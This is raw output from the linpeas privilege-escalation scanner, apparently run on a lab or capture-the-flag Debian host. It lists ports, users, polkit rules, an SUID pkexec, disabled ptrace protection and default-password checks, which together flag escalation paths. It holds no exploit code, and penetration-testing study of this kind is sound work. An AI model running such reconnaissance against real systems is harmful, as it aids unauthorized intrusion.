/etc/inetd.conf Not Found                                                      
/etc/xinetd.d Not Found                                                        
                                                                               
══╣ Installed r-service server packages
  No related packages found via dpkg                                           

══╣ /etc/hosts.equiv and /etc/shosts.equiv
                                                                               
══╣ Per-user .rhosts files
.rhosts Not Found                                                              
                                                                               
══╣ PAM rhosts authentication
/etc/pam.d/rlogin|rsh Not Found                                                
                                                                               
══╣ SSH HostbasedAuthentication
  HostbasedAuthentication no or not set                                        

══╣ Potential DNS control indicators (local)
  Not detected                                                                 

╔══════════╣ Crontab UI (root) misconfiguration checks
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                          
crontab-ui Not Found                                                           
                                                                               

                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                           
                              ╚═════════════════════╝                          
╔══════════╣ Interfaces
default         0.0.0.0                                                        
loopback        127.0.0.0
link-local      169.254.0.0

eth0      Link encap:Ethernet  HWaddr 00:50:56:2e:26:e8  
          inet addr:172.16.53.36  Bcast:172.16.55.255  Mask:255.255.252.0
          inet6 addr: fe80::250:56ff:fe2e:26e8/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:82224 errors:0 dropped:0 overruns:0 frame:0
          TX packets:76069 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:15476322 (14.7 MiB)  TX bytes:7701969 (7.3 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:29 errors:0 dropped:0 overruns:0 frame:0
          TX packets:29 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:3222 (3.1 KiB)  TX bytes:3222 (3.1 KiB)


╔══════════╣ Hostname, hosts and DNS
══╣ Hostname Information                                                       
System hostname: Clover                                                        
FQDN: Clover

══╣ Hosts File Information
Contents of /etc/hosts:                                                        
  127.0.0.1     localhost
  127.0.1.1     Clover
  ::1     localhost ip6-localhost ip6-loopback
  ff02::1 ip6-allnodes
  ff02::2 ip6-allrouters

══╣ DNS Configuration
DNS Servers (resolv.conf):                                                     
  114.114.114.114
  114.114.115.115
-e 
Systemd-resolved configuration:
  [Resolve]
-e 
NetworkManager DNS settings:
-e 
DNS Domain Information:
(none)

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                  
══╣ Active Ports (netstat)                                                     
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:42579           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::111                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::21                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
tcp6       0      0 ::1:25                  :::*                    LISTEN      -               
tcp6       0      0 :::37562                :::*                    LISTEN      -               

╔══════════╣ Network Traffic Analysis Capabilities
                                                                               
══╣ Available Sniffing Tools
No sniffing tools found                                                        

══╣ Network Interfaces Sniffing Capabilities
Interface eth0: Not sniffable                                                  
No sniffable interfaces found

╔══════════╣ Firewall Rules Analysis
                                                                               
══╣ Iptables Rules
No permission to list iptables rules                                           

══╣ Nftables Rules
nftables Not Found                                                             
                                                                               
══╣ Firewalld Rules
firewalld Not Found                                                            
                                                                               
══╣ UFW Rules
UFW is not running                                                             

╔══════════╣ Inetd/Xinetd Services Analysis
                                                                               
══╣ Inetd Services
inetd Not Found                                                                
                                                                               
══╣ Xinetd Services
xinetd Not Found                                                               
                                                                               
══╣ Running Inetd/Xinetd Services
Active Services (from netstat):                                                
-e 
Active Services (from ss):
-e 
Running Service Processes:

╔══════════╣ Internet Access?
Port 443 is not accessible with curl                                           
Port 80 is accessible
ICMP is accessible
DNS accessible
Port 443 is not accessible



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                           
                               ╚═══════════════════╝                           
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users                                                                       
uid=1000(asta) gid=1000(asta) groups=1000(asta),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),118(bluetooth)

╔══════════╣ PGP Keys and Related Files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#pgp-keys                                                                    
GPG:                                                                           
GPG is installed, listing keys:
-e 
NetPGP:
netpgpkeys Not Found
-e                                                                             
PGP Related Files:
Found: /home/asta/.gnupg
total 20
drwx------  2 asta asta 4096 Dec 14 02:55 .
drwx------ 17 asta asta 4096 Apr  7  2021 ..
-rw-------  1 asta asta 7680 Apr  7  2021 gpg.conf
-rw-------  1 asta asta    0 Apr  7  2021 pubring.gpg
-rw-------  1 asta asta    0 Apr  7  2021 secring.gpg
-rw-------  1 asta asta   40 Apr  7  2021 trustdb.gpg

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                               
                                                                               

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                                                         
ptrace protection is disabled (0), so sudo tokens could be abused              

doas.conf Not Found
                                                                               
╔══════════╣ Checking Pkexec and Polkit
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2                                   
                                                                               
══╣ Polkit Binary
Pkexec binary found at: /usr/bin/pkexec                                        
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 23184 Jan 28  2019 /usr/bin/pkexec
pkexec version 0.105

══╣ Polkit Policies
Checking /etc/polkit-1/localauthority.conf.d/:                                 

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo
Checking /usr/share/polkit-1/rules.d/:
polkit.addRule(function(action, subject) {
  if (action.id == "org.freedesktop.NetworkManager.settings.modify.system" &&
        subject.local && subject.active && 
        (subject.isInGroup ("sudo") || subject.isInGroup ("netdev"))) {
    return polkit.Result.YES;
  }
});
polkit.addRule(function(action, subject) {
    if ((action.id == "org.freedesktop.ModemManager1.Device.Control" ||
         action.id == "org.freedesktop.ModemManager1.Location") &&
        subject.user == "geoclue") {
        return polkit.Result.YES;
    }
});
polkit.addRule(function(action, subject) {
        if ((action.id == "org.freedesktop.locale1.set-locale" ||
             action.id == "org.freedesktop.locale1.set-keyboard" ||
             action.id == "org.freedesktop.hostname1.set-static-hostname" ||
             action.id == "org.freedesktop.hostname1.set-hostname" ||
             action.id == "org.gnome.controlcenter.datetime.configure") &&
            subject.local &&
            subject.active &&
            subject.isInGroup ("sudo")) {
                    return polkit.Result.YES;
            }
});
polkit.addRule(function(action, subject) {
    if ((action.id == "org.freedesktop.packagekit.upgrade-system" ||
         action.id == "org.freedesktop.packagekit.trigger-offline-update") &&
        subject.active == true && subject.local == true &&
        subject.isInGroup("sudo")) {
            return polkit.Result.YES;
    }
});

══╣ Polkit Authentication Agent
root       721  0.0  0.1 280100  7464 ?        Ssl  02:28   0:00 /usr/lib/policykit-1/polkitd --no-debug

╔══════════╣ Superusers and UID 0 Users
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html                                                 
                                                                               
══╣ Users with UID 0 in /etc/passwd
root:x:0:0:root:/root:/bin/bash                                                

══╣ Users with sudo privileges in sudoers
                                                                               
╔══════════╣ Users with console
asta:x:1000:1000:asta,,,:/home/asta:/bin/bash                                  
root:x:0:0:root:/root:/bin/bash
speech-dispatcher:x:113:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
sword:x:1001:1001:,,,:/home/sword:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                         
uid=1000(asta) gid=1000(asta) groups=1000(asta),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),118(bluetooth)
uid=1001(sword) gid=1001(sword) groups=1001(sword)
uid=100(systemd-timesync) gid=103(systemd-timesync) groups=103(systemd-timesync)
uid=101(systemd-network) gid=104(systemd-network) groups=104(systemd-network)
uid=102(systemd-resolve) gid=105(systemd-resolve) groups=105(systemd-resolve)
uid=103(systemd-bus-proxy) gid=106(systemd-bus-proxy) groups=106(systemd-bus-proxy)                                                                           
uid=104(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=105(avahi) gid=112(avahi) groups=112(avahi)
uid=106(Debian-exim) gid=114(Debian-exim) groups=114(Debian-exim)
uid=107(statd) gid=65534(nogroup) groups=65534(nogroup)
uid=108(avahi-autoipd) gid=117(avahi-autoipd) groups=117(avahi-autoipd)
uid=109(colord) gid=119(colord) groups=119(colord)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=111(geoclue) gid=120(geoclue) groups=120(geoclue)
uid=112(pulse) gid=122(pulse) groups=122(pulse),29(audio)
uid=113(speech-dispatcher) gid=29(audio) groups=29(audio)
uid=114(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=115(rtkit) gid=124(rtkit) groups=124(rtkit)
uid=116(saned) gid=125(saned) groups=125(saned),113(scanner)
uid=117(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=118(hplip) gid=7(lp) groups=7(lp)
uid=119(Debian-gdm) gid=126(Debian-gdm) groups=126(Debian-gdm)
uid=120(mysql) gid=127(mysql) groups=127(mysql)
uid=121(ftp) gid=128(ftp) groups=128(ftp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Currently Logged in Users
                                                                               
══╣ Basic user information
 02:55:19 up 26 min,  2 users,  load average: 0.31, 0.08, 0.03                 
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
asta     pts/0    172.16.55.210    02:50   36.00s  0.34s  0.00s /bin/sh ./linpeas.sh

══╣ Active sessions
 02:55:19 up 26 min,  2 users,  load average: 0.31, 0.08, 0.03                 
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
asta     pts/0    172.16.55.210    02:50   36.00s  0.34s  0.00s w

══╣ Logged in users (utmp)
           system boot  2025-12-14 10:28                                       
(unknown) ? :0           2025-12-14 02:28   ?           912 (:0)
           run-level 5  2025-12-14 02:28
LOGIN      tty1         2025-12-14 02:28               683 id=tty1
asta     + pts/0        2025-12-14 02:50  old         1354 (172.16.55.210)

══╣ SSH sessions
ESTAB      0      0              172.16.53.36:22           172.16.55.210:58162 

══╣ Screen sessions
                                                                               
══╣ Tmux sessions
                                                                               
╔══════════╣ Last Logons and Login History
                                                                               
══╣ Last logins
asta     pts/0        172.16.55.210    Sun Dec 14 02:50   still logged in      
(unknown :0           :0               Sun Dec 14 02:28   still logged in   
reboot   system boot  3.16.0-11-amd64  Sun Dec 14 10:28 - 02:55  (-7:-33)   
(unknown :0           :0               Sun Dec 14 01:18 - crash  (09:09)    
reboot   system boot  3.16.0-11-amd64  Sun Dec 14 09:18 - 02:55  (-6:-23)   
(unknown :0           :0               Sun Dec 14 01:17 - crash  (08:01)    
reboot   system boot  3.16.0-11-amd64  Sun Dec 14 09:17 - 02:55  (-6:-22)   

wtmp begins Sun Dec 14 09:17:30 2025

══╣ Failed login attempts
                                                                               
══╣ Recent logins from auth.log (limit 20)
                                                                               
══╣ Last time logon each user
Username         Port     From             Latest                              
asta             pts/0    172.16.55.210    Sun Dec 14 02:50:21 -0500 2025
sword            pts/1    kali             Fri Mar 26 17:34:16 -0400 2021

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)       
                                                                               
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                    
                                                                               


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                            
                             ╚══════════════════════╝                          
╔══════════╣ Useful software
/usr/bin/base64                                                                
/usr/bin/curl
/usr/bin/lua
/usr/bin/make
/bin/nc.traditional
/usr/bin/ncat
/bin/netcat
/usr/bin/nmap
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget
/usr/bin/xterm

╔══════════╣ Installed Compilers
/usr/share/gcc-4.9                                                             

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.10 (Debian)                         
Server built:   Sep 30 2019 19:32:08
httpd Not Found
                                                                               
Nginx version: nginx Not Found
                                                                               
/etc/apache2/mods-enabled/php5.conf-<FilesMatch ".+\.ph(p[345]?|t|tml)$">
/etc/apache2/mods-enabled/php5.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php5.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php5.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php5.conf-<FilesMatch ".+\.ph(p[345]?|t|tml)$">
/etc/apache2/mods-available/php5.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php5.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php5.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Mar 17  2021 /etc/apache2/sites-enabled            
drwxr-xr-x 2 root root 4096 Mar 17  2021 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Mar 17  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf                                     
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Sep 30  2019 /etc/apache2/sites-available/000-default.conf                                                                        
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Mar 17  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 72664 Jun 28  2020 /etc/php5/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysql.allow_local_infile = On
mysql.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
sybct.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 root root 72340 Jun 28  2020 /etc/php5/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysql.allow_local_infile = On
mysql.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
sybct.allow_persistent = On
mssql.allow_persistent = On



╔══════════╣ Analyzing X11 Files (limit 70)
-rw------- 1 asta asta 52 Apr  7  2021 /home/asta/.Xauthority                  

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Dec 10  2017 /usr/share/doc/rsync/examples/rsyncd.conf                                                                            
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Wifi Connections Files (limit 70)
drwxr-xr-x 2 root root 4096 Mar 17  2021 /etc/NetworkManager/system-connections
drwxr-xr-x 2 root root 4096 Mar 17  2021 /etc/NetworkManager/system-connections
-rw------- 1 root root 170 Mar 17  2021 /etc/NetworkManager/system-connections/Wired connection 1                                                             


╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Mar 26  2021 /etc/pam.d                            
-rw-r--r-- 1 root root 2133 Mar 25  2019 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                           
drwxr-xr-x 2 root root 4096 Mar 17  2021 /etc/ldap


╔══════════╣ Analyzing Keyring Files (limit 70)
drwx------ 2 asta asta 4096 Apr  7  2021 /home/asta/.local/share/keyrings      
drwxr-xr-x 2 root root 4096 Mar 17  2021 /usr/share/keyrings

-rw------- 1 asta asta 105 Apr  7  2021 /home/asta/.local/share/keyrings/login.keyring                                                                        

-rw------- 1 asta asta 207 Apr  7  2021 /home/asta/.local/share/keyrings/user.keystore                                                                        


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 Mar 22  2014 /usr/share/bash-completion/completions/postfix                                                                        


╔══════════╣ Analyzing FTP Files (limit 70)
-rw-r--r-- 1 root root 6092 Mar 26  2021 /etc/vsftpd.conf                      
anonymous_enable=YES
local_enable=YES
#write_enable=YES
#anon_upload_enable=YES
#anon_mkdir_write_enable=YES
#chown_uploads=YES
#chown_username=whoever
anon_root=/var/ftp/
no_anon_password=YES
-rw-r--r-- 1 root root 564 Feb 21  2016 /usr/share/doc/vsftpd/examples/INTERNET_SITE_NOINETD/vsftpd.conf
anonymous_enable
local_enable
write_enable
anon_upload_enable
anon_mkdir_write_enable
anon_other_write_enable
-rw-r--r-- 1 root root 506 Feb 21  2016 /usr/share/doc/vsftpd/examples/INTERNET_SITE/vsftpd.conf
anonymous_enable
local_enable
write_enable
anon_upload_enable
anon_mkdir_write_enable
anon_other_write_enable
-rw-r--r-- 1 root root 260 Feb  1  2008 /usr/share/doc/vsftpd/examples/VIRTUAL_USERS/vsftpd.conf
anonymous_enable
local_enable=YES
write_enable
anon_upload_enable
anon_mkdir_write_enable
anon_other_write_enable









╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3515 Nov  5  2016 /etc/skel/.bashrc                     
-rwx------ 1 asta asta 3515 Mar 17  2021 /home/asta/.bashrc





-rw-r--r-- 1 root root 675 Nov  5  2016 /etc/skel/.profile
-rwx------ 1 asta asta 675 Mar 17  2021 /home/asta/.profile




╔══════════╣ Analyzing Windows Files (limit 70)
                                                                               





















lrwxrwxrwx 1 root root 20 Mar 26  2021 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 Mar 26  2021 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf                                                                          
-rw-r--r-- 1 root root 81 Mar 26  2021 /var/lib/dpkg/alternatives/my.cnf




-rw-r--r-- 1 root root 473741 Jun 25  2014 /usr/share/gutenprint/5.2/xml/printers.xml                                                                         


























╔══════════╣ Searching mysql credentials and exec
Found readable /etc/mysql/my.cnf                                               
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ MySQL version
mysql  Ver 14.14 Distrib 5.7.30, for Linux (x86_64) using  EditLine wrapper    


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                     
═╣ MySQL connection using root/NOPASS ................. No                     
                                                                               
MySQL is running as user 'mysql' with version 5.7.30.
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                   
netpgpkeys Not Found
netpgp Not Found                                                               
                                                                               
-rw-r--r-- 1 root root 20939 Mar 24  2021 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 5138 Jun 18  2017 /etc/apt/trusted.gpg.d/debian-archive-jessie-automatic.gpg
-rw-r--r-- 1 root root 5147 Jun 18  2017 /etc/apt/trusted.gpg.d/debian-archive-jessie-security-automatic.gpg
-rw-r--r-- 1 root root 2775 Jun 18  2017 /etc/apt/trusted.gpg.d/debian-archive-jessie-stable.gpg
-rw-r--r-- 1 root root 7483 Jun 18  2017 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7492 Jun 18  2017 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2275 Jun 18  2017 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg
-rw-r--r-- 1 root root 3780 Jun 18  2017 /etc/apt/trusted.gpg.d/debian-archive-wheezy-automatic.gpg
-rw-r--r-- 1 root root 2851 Jun 18  2017 /etc/apt/trusted.gpg.d/debian-archive-wheezy-stable.gpg
-rw------- 1 asta asta 0 Apr  7  2021 /home/asta/.gnupg/pubring.gpg
-rw------- 1 asta asta 0 Apr  7  2021 /home/asta/.gnupg/secring.gpg
-rw------- 1 asta asta 40 Apr  7  2021 /home/asta/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 36941 Jun 18  2017 /usr/share/keyrings/debian-archive-keyring.gpg
-rw-r--r-- 1 root root 17538 Jun 18  2017 /usr/share/keyrings/debian-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1652 Jul  6  2019 /var/lib/apt/lists/ftp.us.debian.org_debian_dists_jessie_Release.gpg
-----BEGIN PGP SIGNATURE-----
iQIzBAABCAAdFiEEEmwNJL2KKULMffisdjjQRCuQ0BAFAl0ga7cACgkQdjjQRCuQ
0BA6SQ//XcX8Ht+5nd5TQi468rLb26Gn5VD2iZOcnQmZksR7ny06o0Q+CHoQQqvW
fdRnhH5zVdj1ivcnhQ8ihgCNQILWFcgUgKSlbcSdYvzlJnj6adVboXLkm+Sslght
B/oEI8DLuMA8EhENbyjJ2/0vcTwuj4xaZAAO/Tri+NX55+xt7SbV8u4rfGPgOLlq
7Y54kldHLHM+cFVLTVA2IwfjaNGwoOWkenygH1vroxBiUf0h1CaLDNq4yPo4TSDK
Z24Eb8NWAyjnNdrQ9J0D2qJXXhjfnVXkeUeAIr+LAcmECAo4EnNrDQYt1jsL5An7
VWdTQw6E21jWzgMAqB6IqjsG1R/rlqoE8YtDnl2XiQdvJrhxQ/AR5zLh8fPuirea
2pgsH65DSTTob6Ie6tdWmDTEarRHSMu87a9oaNdBDLecESbXtRqG8ULtI/O3Ygxi
UrjdAsk+eQ0vfCDcWOL4l83yFVIFY/lwmeySriN1rrCFuyl+1QrGtPyFst3zoN0q
nyTdO6MdHU909fKozfYvEoke9G0DCI1N0xiqupO7Csm4yMaUPIdqpe5H67AggD4d
dqY76jk9coCNsAqy5zoi1xSoXDaTl8XjQlmVj7Tx+f2hNTw+16dm0j8Mppt49gw7
Qp8yEkO/nz5+iefSeZpMd4wYmwek3/C0hN4cBfETKVB+63rfAcs=
=37TE
-----END PGP SIGNATURE-----
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAABAgAGBQJdIG1VAAoJEMv41v1RjhfhpkEQAJH/1MMBBRqroekA3xcegY3n
DHTcTWzDD1ioYhVGBp7tu1y1fLkGUcHOUxb05py4oTN16QsNBNzHJRrw6YMYqEB3
dOsJ3tkgnXb4+Jd7r95Pt1o6pso8w4yHICpTUTCCwrkSNUxdFeeuuqGDONl36XK/
saGc/AzfuN0d/xhYzAode7wCc/iBhffZ01JZiwXD+DBuvZCVYn1HHdU78iCOcAgd
DG65m0Y1iQGdDXUuvSkznGFxpMmPhOjHod9+9ZdUx0BbdAX6PblHGtHSgAUQkAEd
5wMERA8X1w2j8nUivAYQ/IzI6lhlfl7c0sg0rF8z6mwxyiEL2gRzNgLnwekn7PEk
Ef+lMnVFIzMnSZUgBhvSgP2V5WNLPavPxtaXxlBchbfEDqNOHBu3qeezVsK+ne4B
BZTlbO9XzMveQjRWNADb8rzzF8QIYcjP1v2JPB/gJIK7HPRAzKs/tvyDXUe8hYdA
Sjs1BKk73/W6DlrOCJRwl/+NvoaN/pfDjf6T/ftI1P2eZuDDH6BOX6HhPHd+Puvb
tkasi14UCs7gjJu9PI5bM5tGUIeykuUQHuHoscIo0HKkgSaurihNuLB89jbMb9uX
EvkrLDeZxgxfbc/sHfbBqKzXK+GatEB+qA3OQKm0np4G1DI3Jr++g0jttaAgwzE7
9njHtrdklIBMMG34aHKf
=KdZN
-----END PGP SIGNATURE-----


drwx------ 2 asta asta 4096 Dec 14 02:55 /home/asta/.gnupg

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                 
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                    
                                                                               




-rw-r--r-- 1 root root 601 Mar 17  2021 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 173 Mar 17  2021 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 93 Mar 17  2021 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 393 Mar 17  2021 /etc/ssh/ssh_host_rsa_key.pub

Port 22
PermitRootLogin without-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes

══╣ Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml

══╣ Some certificates were found (out limited):
/etc/ssl/certs/ACCVRAIZ1.pem                                                   
/etc/ssl/certs/AC_Raíz_Certicámara_S.A..pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AddTrust_External_Root.pem
/etc/ssl/certs/AddTrust_Low-Value_Services_Root.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/ca-certificates.crt
1403PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/doc/openssh-client/examples/sshd_config                             
AuthorizedKeysFile      .ssh/authorized_keys
UsePrivilegeSeparation sandbox          # Default for new installations.
Subsystem       sftp    /usr/libexec/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                               


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no




                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                            
                      ╚════════════════════════════════════╝                   
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                               
strings Not Found                                                              
strace Not Found                                                               
-rwsr-xr-x 1 root root 89K Oct 19  2019 /sbin/mount.nfs                        
-rwsr-xr-x 1 root root 27K Mar 29  2015 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 143K Mar 22  2019 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)                         
-rwsr-xr-x 1 root root 40K May 17  2017 /bin/su
-rwsr-xr-x 1 root root 35K Aug 15  2018 /bin/fusermount
